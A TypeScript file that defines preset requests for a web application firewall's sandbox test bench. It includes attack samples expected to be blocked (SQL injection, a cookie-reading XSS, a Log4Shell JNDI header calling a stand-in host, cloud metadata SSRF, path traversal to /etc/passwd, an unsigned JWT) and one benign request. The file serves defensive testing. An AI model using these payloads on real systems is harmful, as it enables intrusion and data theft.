import type { FirewallSandboxInput } from "@/lib/api/firewall";

/**
 * 测试台的请求样本。攻击样本与 internal/firewall/waf_test.go 的攻击语料同类：
 * 一条都不该放；「正常中文昵称」是业务流量，一条都不该拦。
 */

export interface SandboxPreset {
  key: string;
  label: string;
  /** 期望结果：攻击样本应被拦，业务样本应放行 */
  expect: "block" | "pass";
  input: FirewallSandboxInput;
}

const APP = "/api/v1/apps/demo_app";

export const SANDBOX_PRESETS: SandboxPreset[] = [
  {
    key: "sqli-json",
    label: "SQL 注入（JSON 请求体）",
    expect: "block",
    input: {
      method: "POST",
      url: `${APP}/auth/login`,
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ account: "admin' OR '1'='1' -- ", password: "123456" }, null, 2)
    }
  },
  {
    key: "xss-query",
    label: "XSS（查询串）",
    expect: "block",
    input: {
      method: "GET",
      url: `${APP}/search?q=${encodeURIComponent("<script>alert(document.cookie)</script>")}`,
      headers: {}
    }
  },
  {
    key: "log4shell",
    label: "Log4Shell（请求头）",
    expect: "block",
    input: {
      method: "GET",
      url: `${APP}/config`,
      headers: { "X-Api-Version": "${jndi:ldap://evil.example/a}" }
    }
  },
  {
    key: "ssrf-aliyun",
    label: "阿里云元数据 SSRF",
    expect: "block",
    input: {
      method: "POST",
      url: `${APP}/webhooks/test`,
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ url: "http://100.100.100.200/latest/meta-data/" }, null, 2)
    }
  },
  {
    key: "traversal",
    label: "路径穿越",
    expect: "block",
    input: {
      method: "GET",
      url: `${APP}/files?name=${encodeURIComponent("../../../../etc/passwd")}`,
      headers: {}
    }
  },
  {
    key: "jwt-none",
    label: "alg=none JWT",
    expect: "block",
    input: {
      method: "GET",
      url: `${APP}/user/profile`,
      headers: { Authorization: "Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1aWQiOjF9." }
    }
  },
  {
    key: "benign-nickname",
    label: "正常中文昵称",
    expect: "pass",
    input: {
      method: "PUT",
      url: `${APP}/user/profile`,
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ nickname: "小明·夏天 🌟", bio: "喜欢编程 & 音乐，C++ / Go 都写；座右铭：\"Stay hungry\"" }, null, 2)
    }
  }
];

export const SANDBOX_METHODS = ["GET", "POST", "PUT", "PATCH", "DELETE", "HEAD", "OPTIONS"] as const;

export const CONTENT_TYPES = [
  { key: "json", label: "JSON", value: "application/json", template: '{\n  "content": ""\n}' },
  { key: "form", label: "表单", value: "application/x-www-form-urlencoded", template: "content=" },
  { key: "text", label: "文本", value: "text/plain", template: "" },
  {
    key: "multipart",
    label: "multipart",
    value: "multipart/form-data; boundary=AegisSandboxBoundary",
    template: '--AegisSandboxBoundary\r\nContent-Disposition: form-data; name="content"\r\n\r\n\r\n--AegisSandboxBoundary--\r\n'
  }
] as const;

export type ContentTypeKey = (typeof CONTENT_TYPES)[number]["key"];

/** Content-Type 头 → 快捷切换里的哪一档 */
export function contentTypeKeyOf(value: string): ContentTypeKey | "" {
  const base = value.split(";")[0]!.trim().toLowerCase();
  if (base === "application/json" || base.endsWith("+json")) return "json";
  if (base === "application/x-www-form-urlencoded") return "form";
  if (base === "text/plain") return "text";
  if (base === "multipart/form-data") return "multipart";
  return "";
}

/** 测试台结果里的 reason → 一句话 */
export const SANDBOX_REASON: Record<string, string> = {
  custom_rule: "自定义规则拦截",
  custom_allow: "自定义规则放行，跳过其余检查",
  custom_skip_waf: "自定义规则跳过了 WAF",
  waf_blocked: "WAF 计分越过阈值",
  waf_observed: "观察模式：越过阈值，但只记录不拦",
  waf_disabled: "WAF 未开启，只跑了入口段",
  clean: "没有命中会拦截的规则"
};
